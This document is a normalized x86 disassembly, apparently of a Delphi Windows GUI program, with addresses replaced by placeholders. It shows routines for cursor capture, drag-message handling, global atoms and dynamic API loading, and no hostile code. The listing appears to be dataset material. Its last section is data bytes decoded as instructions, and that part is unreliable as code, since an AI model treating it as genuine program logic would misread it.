mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov esi [ ebx + 0x4 ]
test esi esi
je r-xdata
cmp [ esi + 0x57 ] 0x0
je r-xdata
sub_45a118
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0xc ]
test esi esi
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_458404
mov esi eax
mov eax [ ebp - 0x4 ]
call sub_457f88
add esi eax
mov [ ebp - 0x8 ] esi
mov eax esi
call sub_458404
mov [ ebp - 0x8 ] eax
jmp r-xdata
push ebp
mov eax [ ebx + 0x64 ]
mov eax [ eax + 0x8 ]
call sub_45a088
pop ecx
mov eax [ ebp - 0x8 ]
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_45a168
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov esi edx
mov edi eax
mov bl 0x4
test esi esi
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea edx [ ebp - 0x10 ]
mov eax edi
call sub_44f1f4
lea edx [ ebp - 0x20 ]
mov eax esi
call sub_44f1f4
mov eax [ ebp - 0xc ]
cmp eax [ ebp - 0x1c ]
jg r-xdata
mov eax [ ebp - 0x10 ]
cmp eax [ ebp - 0x20 ]
jg r-xdata
mov eax [ ebp - 0x4 ]
cmp eax [ ebp - 0x14 ]
jge r-xdata
mov eax [ ebp - 0x1c ]
add eax [ ebp - 0x14 ]
sar eax 0x1
jns r-xdata
mov eax [ ebp - 0x8 ]
cmp eax [ ebp - 0x18 ]
jge r-xdata
mov eax [ ebp - 0x8 ]
cmp eax [ ebp - 0x18 ]
jl r-xdata
cmp eax [ ebp - 0xc ]
jg r-xdata
adc eax 0x0
mov eax [ ebp - 0x4 ]
cmp eax [ ebp - 0x14 ]
jl r-xdata
mov bl 0x1
jmp r-xdata
mov bl 0x2
mov bl 0x3
jmp r-xdata
sub_45a1e4
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_457e94
test al al
je r-xdata
xor eax eax
mov [ ebx + 0x24 ] eax
mov eax ebx
call sub_457f40
mov edx [ ebx + 0x20 ]
sub edx eax
mov [ ebx + 0x24 ] edx
jmp r-xdata
mov eax ebx
call sub_4584e8
test eax eax
je r-xdata
mov eax esi
call sub_457f0c
test al al
jne r-xdata
mov esi [ ebx + 0x14 ]
test esi esi
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
push eax
push sub_459f8c
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebx + 0x14 ]
call sub_4587b8
pop esi
pop ebx
pop ebp
retn
mov eax ebx
call sub_4584e8
mov edx [ ebx + 0x20 ]
call sub_458440
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebx + 0x14 ]
call sub_45a1e4
pop ecx
sub_45a264
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi eax
mov esi [ edi + 0x14 ]
test esi esi
je r-xdata
mov eax [ edi + 0x14 ]
call sub_457ef0
dec eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp esi [ eax + 0x64 ]
je r-xdata
mov bl 0x1
jmp r-xdata
cmp [ edi + 0x24 ] 0x0
jne r-xdata
mov eax esi
call sub_457ef0
dec eax
jne r-xdata
test bl bl
je r-xdata
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x18 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
add eax [ edx + 0xc ]
add eax 0xe
mov [ ebp - 0x4 ] eax
mov eax edi
call sub_4584e8
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ edi + 0x14 ]
call sub_45a264
pop ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
push eax
push sub_459f8c
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ edi + 0x14 ]
call sub_4587b8
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ edi + 0x14 ]
call sub_4580ec
mov eax edi
call sub_4584dc
test eax eax
je r-xdata
mov eax edi
call sub_4584e8
mov esi eax
mov eax esi
call sub_458404
push eax
mov eax esi
call sub_457f40
pop edx
sub edx eax
sub edx [ edi + 0x24 ]
cmp edx [ ebp - 0x4 ]
jge r-xdata
mov eax edi
call sub_4584dc
call sub_458404
sub eax [ edi + 0x24 ]
cmp eax [ ebp - 0x4 ]
jge r-xdata
mov eax esi
call sub_458404
mov edx eax
sub edx [ edi + 0x24 ]
mov eax esi
call sub_45842c
mov eax esi
call sub_458404
mov edx eax
add edx [ edi + 0x24 ]
mov eax edi
call sub_45842c
mov eax edi
call sub_4584e8
call sub_45847c
jmp r-xdata
mov bl 0x1
jmp r-xdata
mov eax edi
call sub_457f40
mov edx eax
add edx [ edi + 0x24 ]
mov eax edi
call sub_45842c
mov eax edi
call sub_4584dc
call sub_45847c
mov bl 0x1
jmp r-xdata
sub_45a39c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov ebx ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_458750
test eax eax
je r-xdata
test bl bl
je r-xdata
test bl bl
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea ecx [ ebp - 0x10 ]
mov edx [ esi + 0x44 ]
mov eax [ esi + 0x40 ]
call sub_417330
lea edx [ ebp - 0x10 ]
lea ecx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_458f44
test eax eax
je r-xdata
push ebp
call sub_45a1e4
pop ecx
push ebp
call sub_45a264
pop ecx
jmp r-xdata
xor ebx ebx
mov ebx [ eax + 0x4 ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov edx [ eax ]
call [ edx + 0x7c ]
jmp r-xdata
push ebx
mov edx ebx
mov eax esi
call sub_45a168
mov ecx eax
mov edx esi
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x8 ]
sub_45a424
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
add edi 0xfffffffc
mov eax [ edi ]
mov ebx [ eax + 0x18 ]
mov eax [ edi ]
mov esi [ eax + 0x60 ]
mov eax [ esi + 0x14 ]
cmp [ eax + 0x10 ] 0x1
jne r-xdata
mov eax esi
mov edx 0x2
call sub_457fd0
add eax ebx
mov edx [ edi ]
cmp eax [ edx + 0x50 ]
jl r-xdata
mov eax esi
mov edx 0x1
call sub_457fd0
add eax ebx
mov edx [ edi ]
cmp eax [ edx + 0x54 ]
jl r-xdata
mov eax [ edi ]
mov edx [ eax + 0x60 ]
mov eax [ edi ]
call sub_45a118
sub eax ebx
mov edx [ edi ]
cmp eax [ edx + 0x50 ]
jg r-xdata
mov edx [ edi ]
mov [ edx + 0x50 ] eax
mov eax [ edi ]
mov edx [ eax + 0x60 ]
mov eax [ edi ]
call sub_45a118
sub eax ebx
mov edx [ edi ]
cmp eax [ edx + 0x54 ]
jg r-xdata
mov edx [ edi ]
mov [ edx + 0x54 ] eax
pop edi
pop esi
pop ebx
pop ebp
retn
mov edx [ edi ]
mov [ edx + 0x50 ] eax
mov edx [ edi ]
mov [ edx + 0x54 ] eax
jmp r-xdata
sub_45a4b4
push ebp
mov ebp esp
add esp 0xffffffb8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x48 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_45a88c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx ]
cmp eax 0x202
jg r-xdata
sub eax 0x203
je r-xdata
je r-xdata
lea edx [ ebp - 0x44 ]
mov eax [ ebx + 0x8 ]
call sub_406cdc
lea edx [ ebp - 0x44 ]
lea ecx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_458f44
mov esi eax
test esi esi
je r-xdata
sub eax 0xae2d
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x60 ] 0x0
jne r-xdata
sub eax 0x20
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x32 ] 0x0
je r-xdata
cmp [ esi + 0x4 ] 0x0
je r-xdata
mov edx ebx
mov esi [ ebp - 0x4 ]
mov eax [ esi + 0x34 ]
call [ esi + 0x30 ]
cmp [ ebx + 0xc ] 0x0
jne r-xdata
sub eax 0x12
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_459ee8
jmp r-xdata
lea edx [ ebp - 0xc ]
mov eax [ ebx + 0x8 ]
call sub_406cdc
lea ecx [ ebp - 0x10 ]
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_458f44
mov esi eax
test esi esi
je r-xdata
lea eax [ ebp - 0xc ]
push eax
call GetCursorPos
lea ecx [ ebp - 0x44 ]
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_44f398
mov eax [ ebp - 0x44 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x40 ]
mov [ ebp - 0x8 ] eax
cmp [ ebx + 0x8 ] 0x1
jne r-xdata
sub eax 0x1e0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45a893
lea eax [ ebp - 0x48 ]
call sub_4040ac
retn
mov edx ebx
mov ebx [ ebp - 0x4 ]
mov eax [ ebx + 0x34 ]
call [ ebx + 0x30 ]
cmp [ ebp - 0x10 ] 0x2
jne r-xdata
lea ecx [ ebp - 0x10 ]
mov eax [ ebx + 0x8 ]
lea edx [ eax + 0x28 ]
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0x4 ]
mov esi eax
cmp [ ebp - 0x10 ] 0x12
jne r-xdata
mov eax [ ebx + 0x8 ]
cmp [ eax ] 0xb00b
jne r-xdata
cmp [ ebp - 0x10 ] 0x14
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_456054
cmp eax [ ebx + 0x4 ]
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x60 ] 0x0
je r-xdata
dec eax
je r-xdata
call sub_44e0b4
push 0x1
xor ecx ecx
xor edx edx
mov eax [ esi + 0x4 ]
call sub_45056c
jmp r-xdata
test esi esi
je r-xdata
mov eax [ ebx + 0x8 ]
add eax 0x38
call sub_4040ac
jmp r-xdata
mov ecx [ eax + 0x4 ]
mov edx [ ebx + 0x4 ]
mov eax [ ebp - 0x4 ]
call sub_45a39c
jmp r-xdata
mov edi [ esi + 0x4 ]
mov eax edi
mov edx [ r-xdata ]
call sub_40343c
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_454b84
test eax eax
jle r-xdata
mov eax [ ebp - 0x4 ]
call sub_459f9c
lea edx [ ebp - 0x44 ]
mov eax [ ebx + 0x8 ]
call sub_406cdc
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x44 ]
mov [ eax + 0x50 ] edx
mov edx [ ebp - 0x40 ]
mov [ eax + 0x54 ] edx
push ebp
call sub_45a424
pop ecx
mov eax [ ebp - 0x4 ]
call sub_459f9c
jmp r-xdata
lea edx [ ebp - 0xc ]
mov eax [ ebx + 0x8 ]
call sub_406cdc
lea ecx [ ebp - 0x10 ]
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_458f44
mov esi eax
test esi esi
je r-xdata
jmp r-xdata
mov eax [ ebp - 0x10 ]
sub eax 0x2
je r-xdata
xor edx edx
mov eax edi
call sub_44f774
jmp r-xdata
mov eax edi
call sub_46bd74
jmp r-xdata
lea ecx [ ebp - 0x10 ]
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_458f44
mov esi eax
test esi esi
je r-xdata
cmp [ ebp - 0x10 ] 0x12
jne r-xdata
lea edx [ ebp - 0x20 ]
mov eax esi
call sub_44f1f4
lea ecx [ ebp - 0x20 ]
mov edx esi
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi ]
mov eax [ ebp - 0x20 ]
sub eax [ esi + 0x40 ]
add eax eax
sub [ ebp - 0x20 ] eax
mov eax [ ebp - 0x1c ]
sub eax [ esi + 0x44 ]
add eax eax
sub [ ebp - 0x1c ] eax
mov eax [ esi + 0x48 ]
mov edx [ ebp - 0x18 ]
sub edx [ ebp - 0x20 ]
sub eax edx
add eax eax
sub [ ebp - 0x18 ] eax
mov eax [ esi + 0x4c ]
mov edx [ ebp - 0x14 ]
sub edx [ ebp - 0x1c ]
sub eax edx
add eax eax
sub [ ebp - 0x14 ] eax
lea edx [ ebp - 0x48 ]
mov eax esi
call sub_44f854
mov edx [ ebp - 0x48 ]
mov eax [ ebx + 0x8 ]
add eax 0x38
call sub_404100
mov eax [ ebx + 0x8 ]
lea edi [ eax + 0x18 ]
lea esi [ ebp - 0x20 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
jmp r-xdata
sub eax 0x12
jne r-xdata
cmp [ ebp - 0x10 ] 0x12
jne r-xdata
cmp [ ebp - 0x10 ] 0x2
jne r-xdata
lea ecx [ ebp - 0xc ]
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_459e88
jmp r-xdata
mov eax [ esi + 0x14 ]
movzx eax [ eax + 0x10 ]
movsx edx [ eax * 2 + rw-data ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_46d474
push eax
call SetCursor
mov [ ebx + 0xc ] 0x1
jmp r-xdata
push 0x0
push 0x203
push 0x203
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_456054
push eax
lea eax [ ebp - 0x3c ]
push eax
call PeekMessageA
test eax eax
jne r-xdata
mov eax [ esi + 0x4 ]
cmp [ eax + 0x9b ] 0x1
jne r-xdata
mov eax [ esi + 0x4 ]
mov edx [ r-xdata ]
call sub_40343c
test al al
je r-xdata
cmp [ eax + 0x5d ] 0x1
jne r-xdata
mov eax [ esi + 0x4 ]
mov edx [ eax ]
call [ edx + 0xc4 ]
or ecx 0xffffffff
xor edx edx
call sub_44ff14
jmp r-xdata
sub_45a89c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_403280
mov [ esi + 0x4 ] 0x1
mov [ esi + 0x8 ] 0x5
mov eax [ rw-data ]
cmp [ eax ] 0x2
jne r-xdata
add esp 0xfffffff0
call sub_4035fc
mov eax [ rw-data ]
cmp [ eax ] 0x1
jne r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x4
jge r-xdata
xor eax eax
jmp r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x4
jg r-xdata
mov al 0x1
mov [ esi + 0xd ] al
xor edx edx
mov eax esi
call sub_45aa10
mov eax esi
test bl bl
je r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x4
jne r-xdata
mov eax esi
pop esi
pop ebx
retn
call sub_403654
pop [ fs : 0x0 ]
add esp 0xc
mov eax [ rw-data ]
cmp [ eax ] 0xa
jge r-xdata
sub_45a92c
push ebx
push esi
call sub_403664
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_45a9e8
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4032a0
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40364c
sub_45a990
push ebx
push esi
mov esi eax
push 0x4b
mov eax [ rw-data ]
mov eax [ eax ]
call eax
cmp eax 0x1
sbb ebx ebx
inc ebx
mov [ esi + 0x20 ] bl
test bl bl
je r-xdata
pop esi
pop ebx
retn
push 0x0
lea eax [ esi + 0x10 ]
push eax
push 0x0
push 0x68
call SystemParametersInfoA
sub_45a9c0
push ebx
push ecx
mov ebx eax
push esp
lea eax [ ebx + 0x10 ]
push eax
lea ecx [ ebx + 0x14 ]
lea edx [ ebx + 0x24 ]
lea eax [ ebx + 0x1c ]
call sub_406dd0
mov [ ebx + 0x18 ] eax
cmp [ ebx + 0x1c ] 0x0
setne al
mov [ ebx + 0x20 ] al
pop edx
pop ebx
retn
sub_45a9e8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_45a95c
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
test esi esi
jne r-xdata
push esi
call SetCapture
call ReleaseCapture
jmp r-xdata
sub_45aa10
push ebx
mov ebx eax
sub edx 0x1
jb r-xdata
mov eax ebx
call sub_45a974
cmp [ ebx + 0xd ] 0x0
jne r-xdata
sub edx 0x67
je r-xdata
mov eax ebx
call sub_45a990
pop ebx
retn
mov eax ebx
call sub_45a9c0
jmp r-xdata
cmp [ ebx + 0x20 ] 0x0
je r-xdata
jmp r-xdata
pop ebx
retn
cmp [ ebx + 0xd ] 0x0
je r-xdata
push 0x0
push 0x0
mov eax [ ebx + 0x14 ]
push eax
mov eax [ ebx + 0x18 ]
push eax
call SendMessageA
mov [ ebx + 0x10 ] eax
push 0x0
lea eax [ ebx + 0x10 ]
push eax
push 0x0
push 0x68
call SystemParametersInfoA
jmp r-xdata
sub_45aa74
push ebp
mov ebp esp
push ecx
push ebx
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn
push 0x8000
call SetErrorMode
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_45abda
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
push r-xdata
call GetModuleHandleA
mov ebx eax
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
push eax
call SetErrorMode
retn
push r-xdata
call LoadLibraryA
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
sub_45acf8
push ebx
push esi
push edi
add esp 0xfffffff8
mov ebx edx
mov esi eax
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
cmp bl 0x3
je r-xdata
test bl bl
jne r-xdata
mov dl 0x1
mov eax esi
call sub_45acdc
cmp [ rw-data ] 0x0
je r-xdata
xor edx edx
mov eax esi
call sub_45acdc
jmp r-xdata
push esi
call [ rw-data ]
mov edi eax
test edi edi
je r-xdata
lea eax [ esp + 0x4 ]
push eax
lea eax [ esp + 0x4 ]
push eax
push edi
call [ rw-data ]
mov eax ebx
dec al
je r-xdata
push 0x0
push edi
call [ rw-data ]
jmp r-xdata
dec al
je r-xdata
mov eax [ esp + 0x4 ]
push eax
mov eax [ esp + 0x4 ]
push eax
push edi
call [ rw-data ]
push edi
push esi
call [ rw-data ]
push 0x1
push edi
call [ rw-data ]
jmp r-xdata
jmp r-xdata
push 0x1
push edi
call [ rw-data ]
lea eax [ esp + 0x4 ]
push eax
lea eax [ esp + 0x4 ]
push eax
push edi
call [ rw-data ]
mov eax [ esp ]
and eax 0xfffffff4
xor edx edx
mov dl bl
movzx edx [ edx + rw-data ]
or eax edx
mov [ esp ] eax
sub_45ade8
mov eax [ rw-data ]
mov eax [ eax ]
call sub_4032b0
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
mov eax [ eax ]
call sub_4032b0
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
call sub_4032b0
xor eax eax
mov [ rw-data ] eax
mov eax [ rw-data ]
call sub_4032b0
mov ax [ rw-data ]
push eax
call GlobalDeleteAtom
mov eax rw-data
call sub_4040ac
mov ax [ rw-data ]
push eax
call GlobalDeleteAtom
mov eax rw-data
call sub_4040ac
cmp [ rw-data ] 0x0
je r-xdata
retn
mov eax [ rw-data ]
push eax
call FreeLibrary
sub_45ae70
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
xor eax eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_45afe8
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
push eax
call GetCurrentProcessId
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0x0
lea edx [ ebp - 0xc ]
xor ecx ecx
mov eax r-xdata
call sub_408fe4
mov edx [ ebp - 0x4 ]
mov eax rw-data
call sub_404100
mov eax [ rw-data ]
call sub_40456c
push eax
call GlobalAddAtomA
mov [ rw-data ] ax
lea eax [ ebp - 0x10 ]
push eax
mov eax [ rw-data ]
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x1c ] 0x0
call GetCurrentThreadId
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] 0x0
lea edx [ ebp - 0x20 ]
mov ecx 0x1
mov eax r-xdata
call sub_408fe4
mov edx [ ebp - 0x10 ]
mov eax rw-data
call sub_404100
mov eax [ rw-data ]
call sub_40456c
push eax
call GlobalAddAtomA
mov [ rw-data ] ax
mov eax [ rw-data ]
call sub_40456c
push eax
call RegisterWindowMessageA
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_418c1c
mov [ rw-data ] eax
call sub_45aa74
mov dl 0x1
mov eax [ r-xdata ]
call sub_45a89c
mov [ rw-data ] eax
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_46cd50
mov edx [ rw-data ]
mov [ edx ] eax
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_46de34
mov edx [ rw-data ]
mov [ edx ] eax
mov eax [ rw-data ]
mov eax [ eax ]
mov dl 0x1
call sub_46fa1c
mov ecx r-xdata
mov edx sub_44c964
mov eax [ r-xdata ]
call sub_418170
push r-xdata
call GetModuleHandleA
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45afef
lea eax [ ebp - 0x10 ]
call sub_4040ac
lea eax [ ebp - 0x4 ]
call sub_4040ac
retn
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
sub_45b058
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_45b0b7
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45b0be
retn
mov eax rw-data
call sub_40d564
call sub_45ade8
mov eax rw-data
mov ecx 0x16
mov edx [ r-xdata ]
call sub_404b54
mov eax rw-data
call sub_4040ac
mov eax rw-data
call sub_4040ac
sub_45b0c0
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_45b146
push [ fs : eax ]
mov [ fs : eax ] esp
sub [ rw-data ] 0x1
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45b14d
retn
call GetVersion
and eax 0xff
cmp ax 0x4
setae [ rw-data ]
call sub_45ae70
mov eax [ r-xdata ]
call sub_417fe4
mov eax [ r-xdata ]
call sub_418084
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_418030
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_418030
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_418030
sub_45b39c
inc ebp
add ah al
mov ebx 0xbdc80045
inc ebp
add al ch
mov ebp 0x54110045
inc ebx
jne r-xdata
inc eax
je r-xdata
push esp
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esp
imul esi [ ebx + 0x74 ] r-xdata
pop es
inc edx
add al bl
pop ss
inc edx
add [ eax ] al
sbb eax [ edx ]
sar [ edx - 0x432bffbb ] 0x45
add [ eax ] dl
mov esp 0x540b0045
hlt
insd
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esp
imul esi [ ebx + 0x74 ] r-xdata
pop es
adc [ ebx + eax * 2 + 0x75 ] edx
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f080004 ] al
outsb
inc ebx
push 0x65676e61
outsd
outsb
dec esp
imul esi [ ebx + 0x74 ] r-xdata
mov esp 0x80045b3
add [ eax ] cl
inc ecx
arpl [ esi + ebp * 2 + 0x4c ] si
imul esi [ ebx + 0x74 ] 0xc8640006
inc ebp
add [ eax ] bh
add [ eax ] al
push [ eax + eax ]
add dh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ edi + ecx * 4 + 0x17c00041 ] ch
inc edx
add [ eax - 0x44 ] dl
inc ebp
add al dl
pop ss
inc edx
add al cl
sbb [ edx ] al
clc
sbb al [ edx ]
loopne r-xdata
outsd
insd
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esp
imul esi [ ebx + 0x74 ] r-xdata
push esp
jno r-xdata
add al [ eax ]
push es
dec ecx
insd
popad
jae r-xdata
inc ebp
add [ eax ] cl
add bh bh
dec eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f090005 ] al
outsb
inc ebp
js r-xdata
jl r-xdata
mov dl 0x45
add [ eax ] bl
add bh bh
or [ esi + 0x10045 ] bh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add eax [ eax ]
add eax 0x74617453
cmp [ gs : ebx + 0x41 ] bl
add [ eax ] al
add bh bh
inc eax
add [ eax ] al
inc [ ecx ]
add al ch
xor al 0x40
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x40 ] ah
add [ esp + edx ] dh
inc edx
add ah dh
xor al 0x40
add [ edx ] al
add [ eax ] cl
inc ecx
arpl [ esi + ebp * 2 + 0x4c ] si
imul esi [ ebx + 0x74 ] 0xb4340000
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + esi * 4 + 0x45 ] bh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + esi * 4 + 0x45 ] ch
add [ eax ] ch
add [ eax ] al
or al 0xb3
inc ebp
add al ah
sbb al [ edx ]
in al dx
xor al 0x40
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x4a ] bl
inc ebp
add [ eax ] dh
add [ eax ] al
add [ eax ] ah
inc ecx
add al ah
xor al 0x40
add ah ch
xor al 0x40
arpl [ ebp + 0x74 ] si
cmp [ gs : ebx + 0x41 ] bl
add [ eax ] ah
add bh bh
pushad
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0d0006 ] al
outsb
push ebx
je r-xdata
add [ ebx + edi * 4 ] ch
inc ebp
add [ eax - 0x17ffbe70 ] dl
push ss
inc edx
inc eax
or edx [ ecx + eax * 2 + 0x63 ]
je r-xdata
inc ebp
add [ edi ] al
add [ eax ] al
add [ eax ] al
add [ edi + esi * 4 + 0x45 ] ch
inc ebx
jne r-xdata
add al dh
xor al 0x40
add ah dh
je r-xdata
sbb eax 0x1d440042
inc edx
add [ eax ] bl
sbb eax 0xba680042
inc ebp
add [ eax ] bh
retn
inc edx
add al bl
pop ss
inc edx
add [ eax ] al
sbb eax [ edx ]
mov al [ 0xffffffffdc0045bf ]
sbb eax 0x1d800042
inc edx
add [ ebx + 0x1d440042 ] dl
add [ eax + 0x45b7 ] dh
add [ eax ] al
insb
mov bh 0x45
dec esp
imul esi [ ebx + 0x74 ] 0xb66cc08b
inc ebp
add [ edi ] al
or eax 0x6f685354
jb r-xdata
xor al 0x40
add al ch
xor al 0x40
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x40 ] ah
add [ eax + ebp * 4 ] dl
inc ecx
add [ eax - 0x17ffbe70 ] dl
pushfd
inc ecx
add al ah
fwait
inc ecx
add [ edx + ebp * 4 - 0x550fffbf ] bh
inc ebx
push 0x65676e61
je r-xdata
inc ebx
jne r-xdata
je r-xdata
inc ebp
add [ eax ] dl
add bh bh
push eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f080007 ] al
outsb
push ebp
jo r-xdata
mov cl 0x45
add al ah
sbb al [ edx ]
in al dx
xor al 0x40
add [ esp + edx ] dh
inc edx
add [ edi + esi * 4 + 0xa00045 ] bl
add [ eax ] al
push eax
dec esp
imul esi [ ebx + 0x74 ] r-xdata
